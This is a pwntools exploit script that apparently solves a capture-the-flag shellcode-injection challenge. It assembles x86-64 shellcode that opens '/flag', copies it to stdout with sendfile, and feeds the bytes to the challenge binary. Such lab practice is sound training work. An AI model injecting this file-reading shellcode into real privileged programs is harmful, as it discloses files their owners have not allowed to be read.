from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/shellcode-injection-level2.0"
p = process(challenge_path)

assem='xor rax, rax;\
mov al, 0x67;\
shl rax, 0x20;\
xor rbx, rbx;\
mov ebx, 0x616c662f;\
add rbx, rax;\
push rbx;\
xor rax, rax;\
mov al, 2;\
mov rdi, rsp;\
xor rsi, rsi;\
syscall;\
xor rdi, rdi;\
inc rdi;\
mov rsi, rax;\
xor rdx, rdx;\
xor rax, rax;\
mov al, 0xff;\
mov r10, rax;\
xor rax, rax;\
mov al, 0x28;\
syscall;\
xor rax, rax;\
mov al, 0x3c;\
syscall;\
'
assemed=asm(assem)
p.sendafter("Reading 0x1000 bytes from stdin.\n\n",assemed)
result=p.recvall()
print(result)
# python3 /home/hacker/si2.0.py